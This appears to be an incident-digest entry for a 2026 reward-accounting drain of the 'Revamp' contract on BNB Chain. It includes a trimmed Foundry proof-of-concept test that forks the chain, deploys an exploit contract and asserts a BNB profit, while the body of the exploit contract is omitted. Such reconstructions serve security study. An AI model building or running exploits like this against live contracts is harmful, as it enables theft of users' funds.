# [?] Revamp - Reward Accounting Drain

## Summary
Severity: Unknown
Chain: BNB Chain
Component: Revamp
Published: 2026-03-19
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-03/Revamp_exp.sol
Type: defi-exploit-poc

## Details
Lost: 2.99 BNB

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    RevampExploit private exploit;

    function setUp() public {
        vm.createSelectFork("bsc", FORK_BLOCK);
        fundingToken = address(0);

        vm.label(VULNERABLE_CONTRACT, "Revamp");
        vm.label(PANCAKE_V3_WBNB_POOL, "Pancake V3 WBNB pool");
        vm.label(WBNB_ADDR, "WBNB");
    }

    function testExploit() public balanceLog {
        // Step 1: record Revamp's pre-attack native balance, which determines the first contribution size.
        uint256 attackerBefore = address(this).balance;
        uint256 revampBalanceBefore = address(VULNERABLE_CONTRACT).balance;

        // Step 2: run the local reconstruction and receive the remaining BNB after flash-loan repayment.
        exploit = new RevampExploit(payable(address(this)));
        vm.label(address(exploit), "Local Revamp exploit");
        exploit.attack();

        // Step 3: prove the vulnerable native balance was monetized into attacker profit.
        uint256 profit = address(this).balance - attackerBefore;
        emit log_named_decimal_uint("Revamp native balance before", revampBalanceBefore, 18);
        emit log_named_decimal_uint("BNB profit", profit, 18);

        assertGt(revampBalanceBefore, 0, "Revamp had no native balance");
        assertGt(profit, 2.9 ether, "no meaningful BNB profit");
    }

    receive() external payable {}
}

contract RevampExploit {
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-03/Revamp_exp.sol_
